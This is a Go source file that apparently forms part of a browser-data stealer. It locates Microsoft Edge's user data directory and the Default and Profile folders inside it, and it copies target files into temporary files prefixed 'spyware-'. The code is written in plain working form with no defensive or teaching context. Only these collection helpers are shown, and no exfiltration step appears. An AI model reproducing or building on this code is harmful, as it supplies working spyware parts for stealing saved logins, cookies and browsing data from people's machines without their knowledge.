package edge

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func GetEdgeUserDataPath() (string, error) {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return "", fmt.Errorf("LOCALAPPDATA environment variable not set")
	}
	return filepath.Join(localAppData, "Microsoft", "Edge", "User Data"), nil
}

func GetEdgeProfilePaths() ([]string, error) {
	userDataPath, err := GetEdgeUserDataPath()
	if err != nil {
		return nil, err
	}

	var profilePaths []string
	items, err := os.ReadDir(userDataPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read user data directory: %w", err)
	}

	for _, item := range items {
		if item.IsDir() && (item.Name() == "Default" || len(item.Name()) > 7 && item.Name()[:7] == "Profile") {
			profilePaths = append(profilePaths, filepath.Join(userDataPath, item.Name()))
		}
	}

	return profilePaths, nil
}

func CopyFile(src string) (string, error) {
	dst, err := os.CreateTemp("", "spyware-*")
	if err != nil {
		return "", err
	}
	defer dst.Close()

	srcFile, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer srcFile.Close()

	_, err = io.Copy(dst, srcFile)
	if err != nil {
		return "", err
	}

	return dst.Name(), nil
}
